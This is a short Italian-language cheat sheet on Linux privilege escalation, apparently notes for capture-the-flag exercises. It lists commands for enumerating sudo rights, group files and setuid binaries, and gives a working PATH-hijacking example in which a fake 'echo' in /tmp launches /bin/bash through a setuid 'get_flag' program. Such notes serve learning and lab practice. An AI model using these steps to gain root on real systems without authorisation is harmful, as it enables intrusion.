# Privilege Escalation 

link utile: https://hacktips.it/guida-privilege-escalation-sistemi-linux/

vedere cosa può fare l'utente come root:
```
sudo -l 
```

vedere cosa può fare l'utente nei gruppi:
```
id 
find / -group <GROUP> 2>/dev/null
```

## setuid program

trovare tutti i file setuid
```
find / -perm -u=s -type f 2>/dev/null
```

cercare file in https://gtfobins.github.io/gtfobins/

se il file esegue un altro programma modificare il path e creare un programma locale con lo stesso nome che fa altro.
esempio programma `./get_flag` che esegue echo:
```
cd /tmp
echo "/bin/bash" > echo
chmod 777 echo
echo $PATH
export PATH=/tmp:$PATH
cd /home/flag
./get_flag
```



